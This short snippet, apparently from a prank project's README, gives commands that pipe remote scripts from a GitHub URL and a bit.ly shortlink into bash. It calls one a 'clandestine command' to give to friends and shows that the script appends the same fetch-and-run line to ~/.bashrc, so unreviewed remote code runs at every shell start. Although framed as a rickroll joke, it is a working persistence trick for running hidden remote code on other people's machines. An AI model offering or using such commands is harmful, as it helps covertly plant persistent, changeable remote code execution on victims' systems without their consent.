...
To start rickrollin’ immediately:
    ...
    curl -s -L https://raw.githubusercontent.com/eris-discordia/golden_apple_of_discord/main/to_the_fairest.sh|bash
Here is the clandestine command you can give to your friends 😈

    curl -s -L https://bit.ly/3ryfuzE| bash
...
Which essentially just does:
    ...
    echo "curl -s -L  https://bit.ly/3ryfuzE | bash" >> ~/.bashrc
